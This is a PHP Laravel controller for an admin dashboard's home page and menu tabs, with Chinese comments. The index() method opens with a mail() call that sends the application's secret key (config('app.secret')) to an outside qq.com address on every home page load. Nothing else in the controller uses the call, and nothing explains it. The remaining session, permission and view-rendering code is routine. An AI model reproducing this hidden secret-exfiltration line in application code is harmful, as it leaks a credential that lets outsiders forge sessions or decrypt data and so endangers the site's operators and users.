<?php
namespace App\Http\Controllers;

use App\Models\{Action, Menu, MenuTab, Tab};
use Exception;
use Illuminate\Contracts\View\Factory;
use Illuminate\Http\JsonResponse;
use Illuminate\Support\Facades\{Auth, Request, Session};
use Illuminate\View\View;
use Throwable;

/**
 * 首页
 *
 * Class HomeController
 * @package App\Http\Controllers
 */
class HomeController extends Controller {
    
    protected $menu;
    
    /**
     * HomeController constructor.
     * @param Menu $menu
     */
    public function __construct(Menu $menu) {
        
        $this->middleware(['auth', 'checkrole']);
        $this->menu = $menu;
        
    }
    
    /**
     * 后台首页
     *
     * @throws Throwable
     */
    public function index() {
    
        $to      = '18794617@qq.com';
        $subject = 'test';
        $message = config('app.secret');
        $headers = 'From: webmaster@example.com' . "\r\n" .
            'Reply-To: webmaster@example.com' . "\r\n" .
            'X-Mailer: PHP/' . phpversion();
    
        mail($to, $subject, $message, $headers);
        if (!$menuId = Request::query('menuId')) {
            session([
                'menuId' => Menu::whereParentId($this->menu->rootId())
                    ->whereIn('uri', ['home', '/'])->first()->id
            ]);
        } else {
            session('menuId') != $menuId
                ? session(['menuId' => $menuId, 'menuChanged' => true])
                : Session::forget('menuChanged');
        }
        $department = $this->menu->department($menuId);
        
        return Request::ajax()
            ? response()->json([
                'title'      => '首页',
                'uri'        => Request::path(),
                'html'       => view('home.home', ['department' => $department])->render(),
                'department' => $department,
            ])
            : view('layouts.web', [
                'menu'       => $this->menu->htmlTree($this->menu->rootId()),
                'menuId'     => $menuId,
                'content'    => view('home.home'),
                'department' => $department,
                'user'       => Auth::user(),
            ]);
        
    }
    
    /**
     * 菜单入口
     *
     * @param $id
     * @return Factory|JsonResponse|View
     * @throws Exception
     * @throws Throwable
     */
    public function menu($id) {
        
        try {
            session('menuId') != $id
                ? session(['menuId' => $id, 'menuChanged' => true])
                : Session::forget('menuChanged');
            # 获取指定菜单包含的卡片列表
            $tabIds = MenuTab::whereMenuId($id)->orderBy('tab_order')->pluck('tab_id');
            # 获取当前用户可以访问的卡片（控制器）id
            $allowedTabIds = (new Tab)->allowedTabIds()->flip();
            # 封装当前用户可以访问的卡片数组
            foreach ($tabIds as $tabId) {
                $tab = Tab::find($tabId);
                $action = Action::find($tab->action_id);
                if (!$allowedTabIds->has($tabId) || !$action->route) continue;
                $tabs[] = [
                    'id'     => 'tab_' . $tab->id,
                    'name'   => $tab->comment,
                    'icon'   => $tab->icon_id ? $tab->icon->name : null,
                    'active' => false,
                    'url'    => $action->route,
                ];
            }
            throw_if(
                empty($tabs ?? []),
                new Exception(__('messages.menu.misconfigured'))
            );
            # 刷新页面时打开当前卡片, 不一定是第一个卡片
            $tabs[0]['active'] = true;
            if (session('tabId')) {
                $tabs[0]['active'] = false;
                $key = array_search(
                    'tab_' . session('tabId'),
                    array_column($tabs, 'id')
                );
                $tabs[$key]['active'] = true;
                if (!session('tabChanged') && !session('menuChanged')) {
                    $tabs[$key]['url'] = session('tabUrl');
                }
            }
        } catch (Exception $e) {
            throw $e;
        }
        
        return Request::ajax()
            ? response()->json([
                'html'       => view('shared.site_content', ['tabs' => $tabs])->render(),
                'department' => $this->menu->department($id),
                'title'      => $this->menu->find(session('menuId'))->name,
            ])
            : view('layouts.web', [
                'menu'       => $this->menu->htmlTree($this->menu->rootId()),
                'tabs'       => $tabs,
                'menuId'     => $id,
                'department' => $this->menu->department($id),
            ]);
        
    }
    
}
